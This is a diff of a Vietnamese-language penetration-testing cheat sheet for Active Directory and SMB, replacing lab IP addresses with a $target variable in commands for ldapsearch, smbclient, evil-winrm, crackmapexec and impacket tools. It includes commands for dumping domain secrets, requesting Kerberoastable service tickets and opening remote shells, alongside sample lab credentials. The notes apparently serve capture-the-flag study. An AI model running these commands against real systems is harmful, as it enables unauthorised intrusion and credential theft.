@@ -315,7 +315,7 @@ ldapsearch -x -H ldap://<LDAP_SERVER> -b "<BASE_DN>"
 > [!important]
 > 
 > ```Bash
-> ldapsearch -x -H ldap://10.10.121.48 -b "DC=baby,DC=vl”
+> ldapsearch -x -H ldap://$target -b "DC=baby,DC=vl”
 > ```
 ```Bash
 ldapsearch -H ldap://$target -b "DC=htb,DC=local" "(objectClass=person)" | grep "sAMAccountName:"
@@ -328,7 +328,7 @@ nxc smb <target> -u <username> -p <password> --shares
 > [!important]
 > 
 > ```Bash
-> nxc ldap 10.10.121.48 -u alice -p Winter2024! --shares --users
+> nxc ldap $target -u alice -p Winter2024! --shares --users
 > ```
 > Danh sách các **share** như ADMIN$, C$, Users, SharedDocs, … và **quyền** của user đối với từng share
 ---
@@ -340,7 +340,7 @@ smbpasswd -r <server> -U <username>
 > [!important]
 > 
 > ```Bash
-> smbpasswd -r 10.10.121.48 -U 'Caroline.Robinson'
+> smbpasswd -r $target -U 'Caroline.Robinson'
 > ```
 ---
 # \#SMBclient
@@ -352,7 +352,7 @@ smbclient \\\\<target>\\<share> -U <username>
 > [!important]
 > 
 > ```Bash
-> smbclient \\\\10.10.121.48\\backup -U 'svc-admin'
+> smbclient \\\\$target\\backup -U 'svc-admin'
 > ```
 
 > [!important]
@@ -363,17 +363,17 @@ smbclient \\\\<target>\\<share> -U <username>
 - **Ví dụ**:
     ## Domain user
     ```Bash
-    smbclient //10.10.121.48/ADMIN$ -U baby.vl/caroline.robinson
+    smbclient //$target/ADMIN$ -U baby.vl/caroline.robinson
     ```
     
     ## Local user
     ```Bash
-    smbclient //10.10.121.48/C$ -U administrator
+    smbclient //$target/C$ -U administrator
     ```
     
     ## Anonymous
     ```Bash
-    smbclient //10.10.121.48/public -N
+    smbclient //$target/public -N
     ```
 ## Enumerate SMB
 ```Bash
@@ -391,7 +391,7 @@ evil-winrm -i <ip> -u <username> -p <password> [-d <domain>]
 > ```
 > 
 > ```Bash
-> evil-winrm -i 10.10.121.48 -u caroline.robinson -p 'HackSmarter123!' -d baby.vl \#IP
+> evil-winrm -i $target -u caroline.robinson -p 'HackSmarter123!' -d baby.vl \#IP
 > ```
 
 > Mặc định dùng port 5985 (HTTP), nếu target bật WinRM HTTPS (5986) thì cần thêm **-S** và **-P 5986**
@@ -410,7 +410,7 @@ rpcclient -N <target> \#Anonymous
 > [!important]
 > 
 > ```Bash
-> rpcclient -U "" -N 10.10.10.5 \#Anonymous
+> rpcclient -U "" -N $target \#Anonymous
 > ```
 > 
 > ```Bash
@@ -563,7 +563,7 @@ impacket-lookupsid <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> <TARGET_IP> [-hashes <LMHA
 > [!important]
 > 
 > ```Bash
-> impacket-lookupsid MEGACORP/administrator:Passw0rd123@10.10.10.1 10.10.10.1
+> impacket-lookupsid MEGACORP/administrator:Passw0rd123@$target $target
 > ```
 ---
 
@@ -576,7 +576,7 @@ impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<IP>
 > [!important]
 > 
 > ```Bash
-> impacket-secretsdump test.local/admin:'Passw0rd!'@10.10.10.1
+> impacket-secretsdump test.local/admin:'Passw0rd!'@$target
 > ```
 > 
 > ```Bash
@@ -615,7 +615,7 @@ impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request
 > [!important]
 > 
 > ```Bash
-> impacket-GetUserSPNs test.local/john.doe:Password123 -dc-ip 10.10.10.1 -request
+> impacket-GetUserSPNs test.local/john.doe:Password123 -dc-ip $target -request
 > ```
 > 
 > ```Bash
@@ -639,7 +639,7 @@ cme smb <target> -u <username> -p <password> <options>
 > [!important]
 > 
 > ```Bash
-> crackmapexec smb 10.10.121.48 -u 'svc-admin' -p 'management2005' --shares
+> crackmapexec smb $target -u 'svc-admin' -p 'management2005' --shares
 > ```
 - **Các options**:
     - --shares : Liệt kê các thư mục chia sẻ SMB mà **user** có quyền truy cập
